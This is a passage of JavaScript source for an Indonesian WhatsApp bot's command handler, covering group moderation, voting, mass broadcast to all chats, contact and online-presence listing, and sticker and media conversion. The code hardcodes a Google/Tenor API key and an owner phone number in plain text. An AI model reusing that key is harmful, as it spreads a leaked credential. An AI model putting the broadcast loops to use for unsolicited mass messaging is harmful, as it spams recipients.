                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, jawab, jobotz.user.name, m, {mentions: menst})
            }
            break
case 'restart':
if (!isCreator) return
await repjo(`Restarting...`)
exec(`cd && node index`)
await sleep(4000)
repjo('Sukses')
break
            case 'react': {
                if (!isCreator) return
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                jobotz.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) return
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                repjo(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await jobotz.groupAcceptInvite(result).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) return
                await jobotz.groupLeave(m.chat).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) return
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          repjo(`Exif berhasil diubah menjadi\n\n│➳ Packname : ${global.packname}\n│➳ Author : ${global.author}`)
            }
            break
	case 'kick': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
         if (!isBotAdmins) throw vnAdmin(from)
         if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
	}
	break
	case 'add': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw vnAdmin(from)
        if (!isAdmins) throw vnAdmin(from)
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
	}
	break
	case 'promote': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw vnAdmin(from)
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
	}
	break
	case 'demote': {
	    if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw vnAdmin(from)
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.updateBlockStatus(users, 'block').then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.updateBlockStatus(users, 'unblock').then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
	    if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await jobotz.groupUpdateSubject(m.chat, text).then((res) => repjo(mess.success)).catch((err) => repjo(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
          if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await jobotz.groupUpdateDescription(m.chat, text).then((res) => repjo(mess.success)).catch((err) => repjo(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) return
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                await jobotz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                repjo(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw vnAdmin(from)
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                await jobotz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                repjo(mess.success)
                }
                break

 case 'tagall': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
let teks = `
•══✪〘 👥 *Tag All* 〙✪══•
᯽⊱━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━⊰᯽ \nINFO: ${q ? q : 'kosong'}\n᯽⊱━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈͟𝙰͟𝙽͟⁰͟¹͟⁷͟⁸͟²͟⁵͟¹͟⁰͟⁰͟⁴〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━⊰᯽ \n`
                for (let mem of participants) {
                teks += `╭━─━─━─≪✠≫─━─━─━╮ \n│➳ @${mem.id.split('@')[0]}\n╰━─━─━─≪✠≫─━─━─━╯\n᯽⊱━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈͟𝙰͟𝙽͟⁰͟¹͟⁷͟⁸͟²͟⁵͟¹͟⁰͟⁰͟⁴〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━⊰᯽ `
 }
 jobotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id),
contextInfo: {
externalAdReply: {
title: `© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
body:`Runtime ${runtime(process.uptime())}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
thumbnailUrl: `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}})
}
break
                case 'hidetag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            jobotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break

	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return repjo(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `│➳ *${i.name}* : ${i.result}\n\n`
                }
                repjo(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            repjo(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: jobotz.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            jobotz.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: jobotz.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            jobotz.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: jobotz.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            jobotz.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${jobotz.user.id}
`
jobotz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            repjo('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === 'close'){
                    await jobotz.groupSettingUpdate(m.chat, 'announcement').then((res) => repjo(`Sukses Menutup Group`)).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await jobotz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => repjo(`Sukses Membuka Group`)).catch((err) => repjo(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mode Group`, jobotz.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
             if (args[0] === 'open'){
                await jobotz.groupSettingUpdate(m.chat, 'unlocked').then((res) => repjo(`Sukses Membuka Edit Info Group`)).catch((err) => repjo(jsonformat(err)))
             } else if (args[0] === 'close'){
                await jobotz.groupSettingUpdate(m.chat, 'locked').then((res) => repjo(`Sukses Menutup Edit Info Group`)).catch((err) => repjo(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mode Edit Info`, jobotz.user.name, m)

            }
            }
            break

case 'welcome': {
if (!isCreator) return 
if (!m.isGroup) return mess.group
if (args.length < 1) return repjo('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return repjo('Sudah Aktif')
wlcm.push(from)
repjo('Succes menyalakan welcome di group ini 🌷')
} else if (args[0] === "off") {
if (!welcm) return repjo('Sudah Mati')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
repjo('Succes mematikan welcome di group ini 🌷')
} else {
repjo('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return repjo(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                repjo(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return repjo(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                repjo(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mode Antilink`, jobotz.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return repjo(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                repjo(`${jobotz.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return repjo(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                repjo(`${jobotz.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mute Bot`, jobotz.user.name, m)
                }
             }
             break
 case 'linkgrup': case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                let response = await jobotz.groupInviteCode(m.chat)
                jobotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await jobotz.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await jobotz.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                jobotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await jobotz.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                repjo(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/jobotz-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      jobotz.send5ButImg(i, txt, jobotz.user.name, global.thumb, btn)
                    }
                repjo(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                repjo(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/jobotz-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      jobotz.send5ButImg(yoi, txt, jobotz.user.name, global.thumb, btn)
		}
		repjo('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) repjo('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `│➳ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━│➳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │➳ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                jobotz.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return repjo('Reply Pesannya!!')
		let wokwol = await jobotz.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return repjo('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 jobotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await jobotz.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 jobotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    jobotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│➳ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!isCreator) return
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            repjo(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await jobotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return repjo('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await jobotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            repjo(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            repjo(db)
        }
        break
            case 'emojimix': {
            if (!isCreator) return
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await jobotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!isCreator) return
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await jobotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp2': case 'ttp': {
	       if (!isCreator) return
           if (!text) throw `Example : ${prefix + command} text`
           await jobotz.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'jobotz', 'morou', m, {asSticker: true})

         }
         break
        case 'attp':
        if (!isCreator) return
 try {
if (args.length == 0) return repjo(`Example: ${prefix + command} YUjobotz`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await jobotz.sendMessage(m.chat, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
 console.log(e)
 repjo(`Maap sedang error coba lagi besok`)            
}
break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	       if (!isCreator) return
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        repjo(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await jobotz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            repjo(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                repjo(mess.wait)
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    jobotz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
	        if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                repjo(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await jobotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            repjo(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            jobotz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (!isCreator) return
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            repjo(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            jobotz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${jobotz.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
